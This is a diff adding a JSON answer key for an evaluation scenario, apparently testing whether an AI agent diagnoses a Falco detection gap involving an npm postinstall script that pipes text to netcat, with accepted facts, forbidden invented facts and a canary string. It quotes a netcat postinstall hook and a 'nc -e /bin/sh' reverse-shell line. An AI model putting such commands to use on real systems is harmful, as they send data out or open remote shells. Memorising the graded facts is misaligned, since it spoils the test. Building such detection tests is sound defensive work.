@@ -1,0 +1,51 @@
+{
+  "schema_version": "1.0.0",
+  "scenario_id": "rule-gap-falco-malicious-npm-network-tool",
+  "scenario_version": "0.1.0",
+  "accepted_fact_sets": [
+    [
+      {
+        "fact_id": "runtime-npm-install",
+        "resource_ref": "job/npm-install-action",
+        "field_path": "spec.template.spec.containers[0].command[2]",
+        "observed_value": "npm install /tmp/package --foreground-scripts",
+        "description": "NPM installs a package at container runtime with lifecycle output enabled."
+      },
+      {
+        "fact_id": "postinstall-launches-netcat",
+        "resource_ref": "configmap/controlled-npm-package",
+        "field_path": "data.package.json.scripts.postinstall",
+        "observed_value": "printf controlled-npm | nc npm-network-sink 8080",
+        "description": "The package postinstall lifecycle launches netcat as a descendant of npm."
+      },
+      {
+        "fact_id": "npm-network-target-is-controlled",
+        "resource_ref": "service/npm-network-sink",
+        "field_path": "spec.ports[0].port",
+        "observed_value": "8080",
+        "description": "Netcat connects only to the namespace-local sink Service."
+      }
+    ]
+  ],
+  "accepted_actions": [
+    { "action_id": "no-op", "description": "Read-only diagnosis only.", "operation": "no_action" }
+  ],
+  "contradiction_facts": [
+    {
+      "fact_id": "invented-remote-command-netcat",
+      "resource_ref": "configmap/controlled-npm-package",
+      "field_path": "data.package.json.scripts.postinstall",
+      "observed_value": "nc -e /bin/sh",
+      "description": "The lifecycle command sends fixed text and enables no remote command execution."
+    },
+    {
+      "fact_id": "invented-public-package",
+      "resource_ref": "job/npm-install-action",
+      "field_path": "spec.template.spec.containers[0].command[2]",
+      "observed_value": "npm install <registry package>",
+      "description": "The installed package is the ConfigMap-backed local fixture."
+    }
+  ],
+  "expects_uncertainty": false,
+  "secret_canary": "EVAL-CANARY-RULE-GAP-882d0336bba49df5"
+}
